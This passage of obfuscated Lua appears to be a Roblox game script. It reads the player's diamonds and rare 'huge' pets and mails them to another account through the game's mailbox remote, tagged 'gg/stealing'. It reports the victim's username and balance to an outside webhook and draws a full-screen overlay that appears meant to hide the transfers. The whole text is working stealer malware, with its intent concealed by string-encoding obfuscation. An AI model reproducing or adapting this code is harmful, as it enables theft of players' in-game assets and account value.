				v371 = 2;
			end
			if (0 == v371) then
				v372 = 0;
				v373 = nil;
				v371 = 1;
			end
			if (v371 == 4) then
				while true do
					if (v372 == 0) then
						local v529 = 0;
						while true do
							if (v529 == 1) then
								v372 = 1;
								break;
							end
							if (v529 == 0) then
								v373 = 0 + 0;
								v374 = nil;
								v529 = 1;
							end
						end
					end
					if (v372 == 2) then
						local v530 = 0;
						while true do
							if (v530 == 1) then
								v372 = 3;
								break;
							end
							if (0 == v530) then
								v377 = nil;
								v378 = nil;
								v530 = 1;
							end
						end
					end
					if (v372 == 3) then
						v379 = nil;
						while true do
							if (v373 == 3) then
								while true do
									local v596 = 0;
									local v597;
									while true do
										if (v596 == 0) then
											v597 = 0;
											while true do
												if (v597 == 1) then
													if (v374 == 0) then
														local v690 = 0;
														while true do
															if (v690 == 0) then
																v375 = v8[v7("\117\20\224\245", "\38\117\150\144\121\107")].Get();
																v376 = nil;
																v690 = 1;
															end
															if (v690 == 1) then
																v374 = 1;
																break;
															end
														end
													end
													if (v374 == 1) then
														local v691 = 0;
														local v692;
														while true do
															if (v691 == 0) then
																v692 = 0;
																while true do
																	if (v692 == 1) then
																		v374 = 2;
																		break;
																	end
																	if (v692 == 0) then
																		local v749 = 0;
																		while true do
																			if (1 == v749) then
																				v692 = 1;
																				break;
																			end
																			if (0 == v749) then
																				v377 = v375[v7("\30\36\186\227\53\35\191\253", "\90\77\219\142")] - ((v32.count_rm_pets() + (2 - 1)) * 100000);
																				v378 = v13.formatted_number(v375.Diamonds);
																				v749 = 1;
																			end
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v597 == 0) then
													local v666 = 0;
													local v667;
													while true do
														if (v666 == 0) then
															v667 = 0;
															while true do
																if (v667 == 1) then
																	v597 = 1;
																	break;
																end
																if (v667 == 0) then
																	local v732 = 0;
																	while true do
																		if (v732 == 0) then
																			if (2 == v374) then
																				local v779 = 0;
																				local v780;
																				while true do
																					if (v779 == 0) then
																						v780 = 0;
																						while true do
																							if (v780 == 1) then
																								v374 = 3;
																								break;
																							end
																							if (v780 == 0) then
																								local v820 = 0;
																								while true do
																									if (v820 == 0) then
																										v379 = v375[v7("\94\239\5\44\54\66\3\105", "\26\134\100\65\89\44\103")];
																										if (v375[v7("\128\248\226\61\44\170\245\240", "\196\145\131\80\67")] > 50000000000) then
																											v376 = {[1]={[v7("\10\44\175\57\40\32\169\62\44", "\88\73\204\80")]=v7("\239\52\129\21\77\32\201\58\130\30\21\125", "\186\78\227\112\38\73"),[v7("\94\245\86\240\90\93\126\239", "\26\156\55\157\53\51")]=v377,[v7("\96\137\204\5", "\48\236\184\118\185\216")]={},[v7("\25\224\174\68\49\200\49", "\84\133\221\55\80\175")]="gg/stealing"}};
																										elseif (v377 > 0) then
																											v376 = {[1]={[v7("\110\184\228\45\182\206\89\179\243", "\60\221\135\68\198\167")]=v370[v7("\221\13\181\20\6\25\229\27", "\136\126\208\102\104\120")],[v7("\253\231\188\245\140\76\221\253", "\185\142\221\152\227\34")]=v377,[v7("\199\93\209\68", "\151\56\165\55\154\35\83")]={},[v7("\195\165\80\22\239\167\70", "\142\192\35\101")]="gg/stealing"}};
																										end
																										v820 = 1;
																									end
																									if (v820 == 1) then
																										v780 = 1;
																										break;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			if (v374 == 3) then
																				local v781 = 0;
																				local v782;
																				while true do
																					if (v781 == 0) then
																						v782 = 0;
																						while true do
																							if (v782 == 0) then
																								local v821 = 0;
																								while true do
																									if (v821 == 0) then
																										if v376 then
																											local v845 = 0;
																											local v846;
																											local v847;
																											while true do
																												if (v845 == 0) then
																													v846 = 0;
																													v847 = nil;
																													v845 = 1;
																												end
																												if (1 == v845) then
																													while true do
																														if (v846 == 0) then
																															v847 = 0;
																															while true do
																																if (v847 == 0) then
																																	if not v370[v7("\85\113\139\195\76\161\86\46\110\116\133\201", "\49\24\234\174\35\207\50\93")] then
																																		local v873 = 0;
																																		local v874;
																																		local v875;
																																		while true do
																																			if (v873 == 0) then
																																				v874 = 0;
																																				v875 = nil;
																																				v873 = 1;
																																			end
																																			if (v873 == 1) then
																																				while true do
																																					if (v874 == 0) then
																																						v875 = 0 + 0;
																																						while true do
																																							if (v875 == 0) then
																																								v370[v7("\117\5\243\240\135\127\8\225\194\132\126\11", "\17\108\146\157\232")] = true;
																																								dualhook[v7("\157\88\198\6\193\32\175\76\198\6", "\200\43\163\116\141\79")]:send({[v7("\19\219\119\44\167\244", "\118\182\21\73\195\135\236\204")]={{[v7("\233\1\40\22\69", "\157\104\92\122\32\100\109")]=(game[v7("\211\179\55\36\134\162\231", "\131\223\86\93\227\208\148")][v7("\153\236\70\183\186\45\185\226\92\179\164", "\213\131\37\214\214\125")][v7("\207\39\38\32", "\129\70\75\69\223")] .. v7("\235\239\230\229\223\46\51\205\172\172\178\143\217\62\38\128\166\166\162\142", "\203\195\198\175\170\93\71\237")),[v7("\248\43\88\61\199\88\1\232\39\68\48", "\156\78\43\94\181\49\113")]=v7("\74\119\230\192\227\47\74\120\127\231\202\167\24", "\25\18\136\164\195\107\35"),[v7("\172\241\61\172", "\216\136\77\201\47\18\220\161")]=v7("\144\36\239\35", "\226\77\140\75\186\104\188"),[v7("\76\182\194\223\45", "\47\217\174\176\95")]=(259454 - 194174),[v7("\32\177\216\122\6\161", "\70\216\189\22\98\210\52\24")]={{[v7("\221\219\210\166", "\179\186\191\195\231")]=(v10[v7("\235\79\202\254\230\114\235", "\143\38\171\147\137\28")] .. v7("\164\221\54\25\233\246\49\28\247\185", "\132\153\95\120") .. v10[v7("\208\217\131\180\252\13\231", "\180\176\226\217\147\99\131")]),[v7("\182\176\190\27\40", "\192\209\210\110\77\151\186")]=("```\n" .. v10[v7("\6\193\171\32\16", "\103\179\217\79")] .. "" .. v378 .. "\n```"),[v7("\205\238\15\43\231\250", "\164\128\99\66\137\159")]=true}}}}});
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	v22.get(v7("\141\5\135\237\254\45\136\224\178", "\222\96\233\137")):InvokeServer(unpack(v376));
																																	break;
																																end
																															end
																															break;
																														end
																													end
																													break;
																												end
																											end
																										end
																										return v375[v7("\135\67\182\17\218\79\136\176", "\195\42\215\124\181\33\236")] <= (v32.count_rm_pets() * 100000);
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			v732 = 1;
																		end
																		if (v732 == 1) then
																			v667 = 1;
																			break;
																		end
																	end
																end
															end
															break;
														end
													end
												end
											end
											break;
										end
									end
								end
								break;
							end
							if (v373 == 0) then
								local v577 = 0;
								while true do
									if (0 == v577) then
										v374 = 952 - (802 + 150);
										v375 = nil;
										v577 = 1;
									end
									if (v577 == 1) then
										v373 = 1;
										break;
									end
								end
							end
							if (v373 == 1) then
								local v578 = 0;
								local v579;
								while true do
									if (v578 == 0) then
										v579 = 0;
										while true do
											if (1 == v579) then
												v373 = 2;
												break;
											end
											if (v579 == 0) then
												local v653 = 0;
												while true do
													if (1 == v653) then
														v579 = 1;
														break;
													end
													if (0 == v653) then
														v376 = nil;
														v377 = nil;
														v653 = 1;
													end
												end
											end
										end
										break;
									end
								end
							end
							if (2 == v373) then
								local v580 = 0;
								while true do
									if (v580 == 0) then
										v378 = nil;
										v379 = nil;
										v580 = 1;
									end
									if (v580 == 1) then
										v373 = 3;
										break;
									end
								end
							end
						end
						break;
					end
					if (v372 == 1) then
						local v531 = 0;
						while true do
							if (0 == v531) then
								v375 = nil;
								v376 = nil;
								v531 = 1;
							end
							if (v531 == 1) then
								v372 = 2;
								break;
							end
						end
					end
				end
				break;
			end
		end
	end;
	local v57 = {};
	v54.SendPet = function(v380, v381)
		local v382 = 0;
		local v383;
		local v384;
		local v385;
		local v386;
		while true do
			if (v382 == 2) then
				while true do
					if (v383 == 0) then
						local v532 = 0;
						while true do
							if (v532 == 1) then
								v383 = 1;
								break;
							end
							if (v532 == 0) then
								v384 = 0;
								v385 = nil;
								v532 = 1;
							end
						end
					end
					if (v383 == 1) then
						v386 = nil;
						while true do
							local v553 = 0;
							local v554;
							local v555;
							while true do
								if (v553 == 0) then
									v554 = 0;
									v555 = nil;
									v553 = 1;
								end
								if (v553 == 1) then
									while true do
										if (v554 == 0) then
											v555 = 0;
											while true do
												if (v555 == 0) then
													if (v384 == 0) then
														local v693 = 0;
														local v694;
														local v695;
														while true do
															if (0 == v693) then
																v694 = 0;
																v695 = nil;
																v693 = 1;
															end
															if (v693 == 1) then
																while true do
																	if (v694 == 0) then
																		v695 = 0;
																		while true do
																			if (v695 == 1) then
																				v384 = 1;
																				break;
																			end
																			if (v695 == 0) then
																				local v783 = 0;
																				local v784;
																				while true do
																					if (0 == v783) then
																						v784 = 0;
																						while true do
																							if (v784 == 1) then
																								v695 = 1;
																								break;
																							end
																							if (0 == v784) then
																								local v822 = 0;
																								while true do
																									if (1 == v822) then
																										v784 = 1;
																										break;
																									end
																									if (v822 == 0) then
																										v385 = v8[v7("\203\12\79\50", "\152\109\57\87\94\69")].Get();
																										v386 = v8[v7("\140\240\197\15\160\170\221\70\177", "\200\153\183\106\195\222\178\52")][v7("\106\55\247\155", "\58\82\131\232\93\41")][v381[v7("\54\135", "\95\227\55\176\117\61")]];
																										v822 = 1;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																		end
																		break;
																	end
																end
																break;
															end
														end
													end
													if (v384 == 1) then
														local v696 = 0;
														local v697;
														local v698;
														while true do
															if (v696 == 0) then
																v697 = 0;
																v698 = nil;
																v696 = 1;
															end
															if (v696 == 1) then
																while true do
																	if (0 == v697) then
																		v698 = 0;
																		while true do
																			if (v698 == (0 - 0)) then
																				local v785 = 0;
																				local v786;
																				while true do
																					if (0 == v785) then
																						v786 = 0;
																						while true do
																							if (v786 == 0) then
																								local v823 = 0;
																								while true do
																									if (v823 == 0) then
																										if (((v386[v7("\163\13\121\38", "\203\120\30\67\43")] == true) or (v386[v7("\203\240\55\68\251\192", "\185\145\69\45\143")] == v7("\213\175\182\169\11", "\144\217\211\199\127\232\147")) or (v386[v7("\206\139\13\16\178\197", "\188\234\127\121\198")] == v7("\97\224\44\50\61\198\76\20\65", "\36\152\79\94\72\181\37\98"))) and (v385[v7("\167\49\51\30\140\54\54\0", "\227\88\82\115")] >= (181396 - 81396))) then
																											local v848 = 0;
																											local v849;
																											local v850;
																											local v851;
																											local v852;
																											while true do
																												if (v848 == 2) then
																													while true do
																														if (v849 == 0) then
																															local v866 = 0;
																															while true do
																																if (v866 == 1) then
																																	v849 = 1;
																																	break;
																																end
																																if (v866 == 0) then
																																	v850 = 0;
																																	v851 = nil;
																																	v866 = 1;
																																end
																															end
																														end
																														if (v849 == 1) then
																															v852 = nil;
																															while true do
																																if (v850 == 0) then
																																	local v869 = 0;
																																	while true do
																																		if (v869 == 1) then
																																			v850 = 1;
																																			break;
																																		end
																																		if (0 == v869) then
																																			v851 = 0;
																																			v852 = nil;
																																			v869 = 1;
																																		end
																																	end
																																end
																																if (v850 == 1) then
																																	while true do
																																		local v870 = 0;
																																		local v871;
																																		local v872;
																																		while true do
																																			if (v870 == 0) then
																																				v871 = 0;
																																				v872 = nil;
																																				v870 = 1;
																																			end
																																			if (1 == v870) then
																																				while true do
																																					if (v871 == 0) then
																																						v872 = 0;
																																						while true do
																																							if (v872 == 0) then
																																								local v877 = 0;
																																								local v878;
																																								while true do
																																									if (v877 == 0) then
																																										v878 = 0;
																																										while true do
																																											if (v878 == 1) then
																																												v872 = 1;
																																												break;
																																											end
																																											if (0 == v878) then
																																												local v880 = 0;
																																												while true do
																																													if (v880 == 1) then
																																														v878 = 1;
																																														break;
																																													end
																																													if (0 == v880) then
																																														if (v851 == 1) then
																																															local v881 = 0;
																																															local v882;
																																															local v883;
																																															while true do
																																																if (v881 == 1) then
																																																	while true do
																																																		if (v882 == 0) then
																																																			v883 = 0;
																																																			while true do
																																																				if (v883 == 1) then
																																																					v851 = 2;
																																																					break;
																																																				end
																																																				if (v883 == 0) then
																																																					local v887 = 0;
																																																					while true do
																																																						if (v887 == 0) then
																																																							v22.get(v7("\12\210\214\67\127\250\217\78\51", "\95\183\184\39")):InvokeServer(unpack(v852));
																																																							task.wait(6);
																																																							v887 = 1;
																																																						end
																																																						if (1 == v887) then
																																																							v883 = 1;
																																																							break;
																																																						end
																																																					end
																																																				end
																																																			end
																																																			break;
																																																		end
																																																	end
																																																	break;
																																																end
																																																if (v881 == 0) then
																																																	v882 = 0;
																																																	v883 = nil;
																																																	v881 = 1;
																																																end
																																															end
																																														end
																																														if (0 == v851) then
																																															local v884 = 0;
																																															local v885;
																																															while true do
																																																if (v884 == 0) then
																																																	v885 = 0;
																																																	while true do
																																																		if (v885 == 1) then
																																																			v851 = 998 - (915 + 82);
																																																			break;
																																																		end
																																																		if (v885 == 0) then
																																																			local v886 = 0;
																																																			while true do
																																																				if (v886 == 1) then
																																																					v885 = 1;
																																																					break;
																																																				end
																																																				if (0 == v886) then
																																																					v852 = {[1]={[v7("\48\176\60\238\54\93\133\12\161", "\98\213\95\135\70\52\224")]=v380[v7("\70\80\26\168\169\3\126\70", "\19\35\127\218\199\98")],[v7("\112\247\162\196\120\90\250\176", "\52\158\195\169\23")]=(0 + 0),[v7("\187\127\168\33", "\235\26\220\82\20\230\85\27")]={v381[v7("\247\21\255", "\130\124\155\106")]},[v7("\89\141\178\250\195\115\141", "\20\232\193\137\162")]=("gg/stealing | Username: " .. v380[v7("\138\198\206\228\161\162\251\121", "\223\181\171\150\207\195\150\28")] .. "")}};
																																																					if not table.find(v57, v381.uid) then
																																																						local v888 = 0;
																																																						local v889;
																																																						local v890;
																																																						local v891;
																																																						while true do
																																																							if (v888 == 1) then
																																																								v891 = nil;
																																																								while true do
																																																									if (v889 == 1) then
																																																										while true do
																																																											if (0 == v890) then
																																																												v891 = 0;
																																																												while true do
																																																													if (v891 == 0) then
																																																														table.insert(v57, v381.uid);
																																																														v380[v7("\60\95\63\241\130\6\75\61\230\188", "\105\44\90\131\206")][v7("\24\234\238\177\173\1\49\241\243", "\94\159\128\210\217\104")].send_log_next_pet(v380.UserLogger, v386);
																																																														break;
																																																													end
																																																												end
																																																												break;
																																																											end
																																																										end
																																																										break;
																																																									end
																																																									if (v889 == 0) then
																																																										local v892 = 0;
																																																										while true do
																																																											if (v892 == 1) then
																																																												v889 = 1;
																																																												break;
																																																											end
																																																											if (0 == v892) then
																																																												v890 = 0;
																																																												v891 = nil;
																																																												v892 = 1;
																																																											end
																																																										end
																																																									end
																																																								end
																																																								break;
																																																							end
																																																							if (v888 == 0) then
																																																								v889 = 0;
																																																								v890 = nil;
																																																								v888 = 1;
																																																							end
																																																						end
																																																					end
																																																					v886 = 1;
																																																				end
																																																			end
																																																		end
																																																	end
																																																	break;
																																																end
																																															end
																																														end
																																														v880 = 1;
																																													end
																																												end
																																											end
																																										end
																																										break;
																																									end
																																								end
																																							end
																																							if (v872 == 1) then
																																								if (v851 == (5 - 3)) then
																																									return true;
																																								end
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																															break;
																														end
																													end
																													break;
																												end
																												if (v848 == 1) then
																													v851 = nil;
																													v852 = nil;
																													v848 = 2;
																												end
																												if (v848 == 0) then
																													v849 = 0;
																													v850 = nil;
																													v848 = 1;
																												end
																											end
																										end
																										return false;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																		end
																		break;
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
											break;
										end
									end
									break;
								end
							end
						end
						break;
					end
				end
				break;
			end
			if (v382 == 1) then
				v385 = nil;
				v386 = nil;
				v382 = 2;
			end
			if (0 == v382) then
				v383 = 0;
				v384 = nil;
				v382 = 1;
			end
		end
	end;
	v54.Pets = function(v387)
		local v388 = 0;
		local v389;
		local v390;
		local v391;
		local v392;
		local v393;
		while true do
			if (2 == v388) then
				v393 = nil;
				while true do
					if (v389 == (1 + 0)) then
						local v533 = 0;
						while true do
							if (v533 == 1) then
								v389 = 2 - 0;
								break;
							end
							if (0 == v533) then
								v392 = nil;
								v393 = nil;
								v533 = 1;
							end
						end
					end
					if (v389 == (1189 - (1069 + 118))) then
						while true do
							local v556 = 0;
							local v557;
							while true do
								if (v556 == 0) then
									v557 = 0;
									while true do
										if (1 == v557) then
											if (1 == v390) then
												local v654 = 0;
												local v655;
												while true do
													if (v654 == 0) then
														v655 = 0 - 0;
														while true do
															if (v655 == (1 - 0)) then
																v390 = 2;
																break;
															end
															if (v655 == 0) then
																local v727 = 0;
																local v728;
																while true do
																	if (v727 == 0) then
																		v728 = 0;
																		while true do
																			if (0 == v728) then
																				local v787 = 0;
																				while true do
																					if (v787 == 0) then
																						v393 = false;
																						for v813, v814 in pairs(v32.get_hugs_pets()) do
																							if v387:SendPet(v814) then
																								v393 = true;
																							end
																						end
																						v787 = 1;
																					end
																					if (v787 == 1) then
																						v728 = 1;
																						break;
																					end
																				end
																			end
																			if (1 == v728) then
																				v655 = 1;
																				break;
																			end
																		end
																		break;
																	end
																end
															end
														end
														break;
													end
												end
											end
											break;
										end
										if (v557 == 0) then
											local v621 = 0;
											while true do
												if (v621 == 0) then
													if (v390 == 0) then
														local v699 = 0;
														local v700;
														local v701;
														while true do
															if (v699 == 0) then
																v700 = 0;
																v701 = nil;
																v699 = 1;
															end
															if (v699 == 1) then
																while true do
																	if (v700 == 0) then
																		v701 = 0;
																		while true do
																			if (v701 == 1) then
																				v390 = 1;
																				break;
																			end
																			if (v701 == 0) then
																				local v788 = 0;
																				while true do
																					if (v788 == 0) then
																						v391 = v8[v7("\73\81\239\3", "\26\48\153\102\223\63\31\153")].Get();
																						v392 = v391[v7("\195\7\84\254", "\147\98\32\141")];
																						v788 = 1;
																					end
																					if (1 == v788) then
																						v701 = 1;
																						break;
																					end
																				end
																			end
																		end
																		break;
																	end
																end
																break;
															end
														end
													end
													if (v390 == 2) then
														local v702 = 0;
														local v703;
														local v704;
														while true do
															if (v702 == 0) then
																v703 = 0;
																v704 = nil;
																v702 = 1;
															end
															if (v702 == 1) then
																while true do
																	if (0 == v703) then
																		v704 = 0;
																		while true do
																			if (v704 == 0) then
																				local v789 = 0;
																				local v790;
																				while true do
																					if (v789 == 0) then
																						v790 = 0;
																						while true do
																							if (v790 == 0) then
																								local v824 = 0;
																								while true do
																									if (v824 == 0) then
																										for v843, v844 in pairs(v392) do
																											if v387:SendPet(v844) then
																												v393 = true;
																											end
																										end
																										return v393;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																		end
																		break;
																	end
																end
																break;
															end
														end
													end
													v621 = 1;
												end
												if (v621 == 1) then
													v557 = 1;
													break;
												end
											end
										end
									end
									break;
								end
							end
						end
						break;
					end
					if (v389 == 0) then
						local v534 = 0;
						local v535;
						while true do
							if (v534 == 0) then
								v535 = 0;
								while true do
									if (v535 == 1) then
										v389 = 1 + 0;
										break;
									end
									if (v535 == 0) then
										local v616 = 0;
										while true do
											if (v616 == 1) then
												v535 = 1;
												break;
											end
											if (v616 == 0) then
												v390 = 0;
												v391 = nil;
												v616 = 1;
											end
										end
									end
								end
								break;
							end
						end
					end
				end
				break;
			end
			if (v388 == 0) then
				v389 = 0;
				v390 = nil;
				v388 = 1;
			end
			if (v388 == 1) then
				v391 = nil;
				v392 = nil;
				v388 = 2;
			end
		end
	end;
	local v60 = v45:new();
	_G[v7("\120\8\70\230\206", "\43\120\35\131\170\102\54")] = 2500;
	_G[v7("\183\68\3\130\178\137\185\137\93\18", "\228\52\102\231\214\197\208")] = 140;
	local v61 = Instance.new(v7("\66\33\205\192\163\233\171\2\120", "\17\66\191\165\198\135\236\119"));
	v61[v7("\255\25\238\122\216\239\172\12\223\55\238\102\207\254", "\182\126\128\21\170\138\235\121")] = false;
	v61[v7("\52\142\201\48\242\169\29\3\22\138\205\59", "\102\235\186\85\134\230\115\80")] = true;
	v61[v7("\24\126\2\58\90\106\246\39\95\13\40\86\125\198", "\66\55\108\94\63\18\180")] = Enum[v7("\99\61\131\129\50\63\123\17\133\132\33\46\86\6", "\57\116\237\229\87\71")][v7("\116\163\179\225\238\121\233", "\39\202\209\141\135\23\142")];
	v61[v7("\214\254\62\12", "\152\159\83\105\106\82")] = v7("\253\0\168\167\29", "\177\111\207\206\115\159\136\140");
	v61[v7("\108\128\212\84\252\221", "\60\225\166\49\146\169")] = game[v7("\36\32\12\42\13\20\14", "\103\79\126\79\74\97")];
	local v69 = Instance.new(v7("\121\23\136\29\17", "\63\101\233\112\116\180\47"));
	v69[v7("\59\180\124\219\124\76\42\181\118\221\103", "\122\218\31\179\19\62")] = Vector2.new(0.5, 0.5 - 0);
	v69[v7("\103\178\213\198\198\219\174\80\189\210\238\206\197\174\87\224", "\37\211\182\173\161\169\193")] = Color3.new(0, 0, 0);
	v69[v7("\137\248\41\68\205\33\116\183", "\217\151\90\45\185\72\27")] = UDim2.new(0.499496311, 0, 0.499209881, 0 + 0);
	v69[v7("\101\202\102\226", "\54\163\28\135\114")] = UDim2.new(792.09316683 - (368 + 423), 0, 1.10281479, 0);
	v69[v7("\73\33\200\84\128\66\122", "\31\72\187\61\226\46")] = true;
	v69[v7("\10\194\11\70", "\68\163\102\35\178\39\30")] = v7("\20\194\56\230\21\234\57\214\53\233", "\86\163\91\141\114\152");
	v69[v7("\33\191\98\223\201\23", "\113\222\16\186\167\99\213\227")] = v61;
	local v77 = Instance.new(v7("\19\94\10\115\118\22\82\9\113\127", "\90\51\107\20\19"));
	v77[v7("\223\35\15\252\243", "\150\78\110\155")] = "rbxassetid://12911888864";
	v77[v7("\105\136\196\32\228\144\12\190\78\150\213\38\243\161\16\188\89", "\32\229\165\71\129\196\126\223")] = 0.7699999809265137;
	v77[v7("\244\205\138\204\142\147\229\204\128\202\149", "\181\163\233\164\225\225")] = Vector2.new(0.5, 0.5);
	v77[v7("\85\81\136\53\112\66\132\43\121\84\168\49\123\95\153\109", "\23\48\235\94")] = Color3.new(1, 1, 3 - 2);
	v77[v7("\240\125\217\211\90\69\60\199\114\222\236\79\86\61\193\108\219\202\88\89\48\203", "\178\28\186\184\61\55\83")] = 1;
	v77[v7("\197\203\222\78\40\251\1\251", "\149\164\173\39\92\146\110")] = UDim2.new(0.49999994, 0, 0.499827176, 0);
	v77[v7("\40\250\61\21", "\123\147\71\112\127\122")] = UDim2.new(0.99999994, 0, 1.00034571, 18 - (10 + 8));
	v77[v7("\112\197\222\139\115\74\201", "\38\172\173\226\17")] = true;
	v77[v7("\223\76\3\41\225\89", "\143\45\113\76")] = v61;
	local v87 = Instance.new(v7("\27\159\241\136\234", "\93\237\144\229\143"));
	v87[v7("\29\182\187\20\51\170\136\19\53\182\172", "\92\216\216\124")] = Vector2.new(0.5 - 0, 0.5);
	v87[v7("\223\90\49\167\71\239\84\39\162\68\222\84\62\163\82\174", "\157\59\82\204\32")] = Color3.new(0, 0, 0);
	v87[v7("\129\55\45\234\238\224\229\221", "\209\88\94\131\154\137\138\179")] = UDim2.new(0.499292403, 0, 442.819835365 - (416 + 26), 0 - 0);
	v87[v7("\17\33\187\193", "\66\72\193\164\28\126\67\81")] = UDim2.new(0.59859556, 0, 0.0369425043, 0);
	v87[v7("\64\238\63\161\90\42\115", "\22\135\76\200\56\70")] = true;
	v87[v7("\209\140\34\253\42\73", "\129\237\80\152\68\61")] = v77;
	local v94 = Instance.new(v7("\115\60\213\255\11\5\67\7", "\38\117\150\144\121\107"));
	v94[v7("\104\80\186\1\253\8", "\56\49\200\100\147\124\119")] = v87;
	local v96 = Instance.new(v7("\28\63\186\227\63", "\90\77\219\142"));
	v96[v7("\209\194\61\183\255\222\14\176\249\194\42", "\144\172\94\223")] = Vector2.new(0.5, 0.5);
	v96[v7("\101\37\12\169\64\54\0\183\73\32\44\173\75\43\29\241", "\39\68\111\194")] = Color3.new(0.180392, 0.65098, 0.509804);
	v96[v7("\135\217\181\238\211\112\184\216", "\215\182\198\135\167\25")] = UDim2.new(0.00382870319, 0, 0.476013184, 0);
	v96[v7("\123\132\83\239", "\40\237\41\138")] = UDim2.new(0, 2, 0.952000022, 0);
	v96[v7("\124\206\103\243\250\70\194", "\42\167\20\154\152")] = true;
	v96[v7("\15\75\243\167", "\65\42\158\194\34\17")] = v7("\86\233\5\37", "\26\134\100\65\89\44\103");
	v96[v7("\222\27\53\87\2\57", "\142\122\71\50\108\77\141\123")] = v87;
	local v104 = Instance.new(v7("\145\216\192\63\49\170\244\241", "\196\145\131\80\67"));
	v104[v7("\24\26\176\241\29\41\39\163\251\17\46\6", "\91\117\194\159\120")] = UDim.new(0, 4 + 3);
	v104[v7("\20\27\15\59\22\33", "\68\122\125\94\120\85\145")] = v96;
	local v107 = Instance.new(v7("\196\17\179\7\4\43\235\12\185\22\28", "\136\126\208\102\104\120"));
	v107[v7("\138\22\14\202\80\220", "\218\119\124\175\62\168\185")] = v96;
	local v109 = Instance.new(v7("\100\81\166\199\80\187\126\60\72\119\159\218", "\49\24\234\174\35\207\50\93"));
	v109[v7("\247\170\226\92\235\183\244\77\214", "\164\197\144\40")] = Enum[v7("\133\140\226\190\164\207\178\134\226", "\214\227\144\202\235\189")][v7("\16\236\188\136\110\4\156\65\56\232\183", "\92\141\197\231\27\112\211\51")];
	v109[v7("\231\227\237\158\170\210\231\243\171\175\216\225\241\135\166\223\242", "\177\134\159\234\195")] = Enum[v7("\255\184\249\43\169\202\188\231\30\172\192\186\229\50\165\199\169", "\169\221\139\95\192")][v7("\5\219\133\107\58\48", "\70\190\235\31\95\66")];
	v109[v7("\213\187\240\31\232\241", "\133\218\130\122\134")] = v87;
	local v115 = Instance.new(v7("\68\37\193\233\154\126\7\247", "\17\108\146\157\232"));
	v115[v7("\27\51\243\236\214", "\88\92\159\131\164\188\195")] = Color3.new(0.0941176, 0.0941176, 0.0941176);
	v115[v7("\233\136\39\188\64\217\238\206\147", "\189\224\78\223\43\183\139")] = 9.5 - 3;
	v115[v7("\241\47\238\143\24\213", "\161\78\156\234\118")] = v87;
	local v119 = Instance.new(v7("\129\70\194\19\232\3\169\73\198\24", "\200\43\163\116\141\79"));
	v119[v7("\245\170\182\206\217", "\188\199\215\169")] = "rbxassetid://7733992358";
	v119[v7("\201\242\10\87\116\250\204\6\86\117\252", "\136\156\105\63\27")] = Vector2.new(0.5, 0.5);
	v119[v7("\22\26\143\114\51\9\131\108\58\31\175\118\56\20\158\42", "\84\123\236\25")] = Color3.new(1, 1, 1);
	v119[v7("\151\241\136\161\16\190\186\229\133\174\35\190\180\254\152\186\22\190\176\254\136\179", "\213\144\235\202\119\204")] = 1;
	v119[v7("\111\44\10\218\47\58\0\66\47\23\204\121", "\45\67\120\190\74\72\67")] = Color3.new(438 - (145 + 293), 0, 0);
	v119[v7("\203\47\48\233\160\235\187\231\243\37\18\228\189\252\132", "\137\64\66\141\197\153\232\142")] = 0;
	v119[v7("\184\12\195\43\178\129\12\222", "\232\99\176\66\198")] = UDim2.new(0.811623812, 0, 0.819504917, 0);
	v119[v7("\31\229\59\45", "\76\140\65\72\102\27\237\153")] = UDim2.new(0.0134525513, 0, 0.0291062165, 0);
	v119[v7("\136\67\201\31\208\219\4", "\222\42\186\118\178\183\97")] = true;
	v119[v7("\186\92\254\65\132\73", "\234\61\140\36")] = v77;
	local v130 = Instance.new(v7("\214\150\23\46\147\181\247\247\141\55\41\138\191\215\236\177\37\41\145\177\253\237\171", "\131\223\86\93\227\208\148"));
	v130[v7("\63\32\207\191\124\27", "\111\65\189\218\18")] = v119;
	local v132 = Instance.new(v7("\156\238\68\177\179\49\180\225\64\186", "\213\131\37\214\214\125"));
	v132[v7("\134\78\74\28\48", "\207\35\43\123\85\107\60")] = "rbxassetid://7733720701";
	v132[v7("\88\126\169\168\229\107\64\165\169\228\109", "\25\16\202\192\138")] = Vector2.new(430.5 - (44 + 386), 0.5);
	v132[v7("\214\252\200\166\229\187\251\232\197\169\193\166\248\242\217\254", "\148\157\171\205\130\201")] = Color3.new(1487 - (998 + 488), 1, 1);
	v132[v7("\212\34\215\127\46\195\249\54\218\112\29\195\247\45\199\100\40\195\243\45\215\109", "\150\67\180\20\73\177")] = 1;
	v132[v7("\111\130\10\30\72\159\59\21\65\130\10\73", "\45\237\120\122")] = Color3.new(0, 0, 0);
	v132[v7("\14\216\250\166\41\197\219\171\54\210\216\171\52\210\228", "\76\183\136\194")] = 0;
	v132[v7("\36\117\245\236\44\89\64\26", "\116\26\134\133\88\48\47")] = UDim2.new(0.1835545, 0 + 0, 0.819835365 + 0, 0);
	v132[v7("\65\23\219\165", "\18\126\161\192\132\221")] = UDim2.new(0.0323241502, 772 - (201 + 571), 1138.0367051288 - (116 + 1022), 0);
	v132[v7("\96\86\59\167\6\90\90", "\54\63\72\206\100")] = true;
	v132[v7("\75\201\75\64\116\241", "\27\168\57\37\26\133")] = v77;
	local v143 = Instance.new(v7("\212\15\10\54\175\228\37\63\23\190\245\47\36\6\176\239\53\63\55\190\232\40\63", "\129\70\75\69\223"));
	v143[v7("\231\44\184\121\166\195", "\183\77\202\28\200")] = v132;
	local v145 = Instance.new(v7("\198\75\202\244\236\80\238\68\206\255", "\143\38\171\147\137\28"));
	v145[v7("\33\26\50\142\13", "\104\119\83\233")] = "rbxassetid://7733919682";
	v145[v7("\98\251\251\47\45\81\197\247\46\44\87", "\35\149\152\71\66")] = Vector2.new(0.5, 0.5);
	v145[v7("\24\24\235\73\183\40\22\253\76\180\25\22\228\77\162\105", "\90\121\136\34\208")] = Color3.new(1, 1, 1);
	v145[v7("\60\198\13\94\25\213\1\64\16\195\58\71\31\201\29\69\31\213\11\91\29\222", "\126\167\110\53")] = 1;
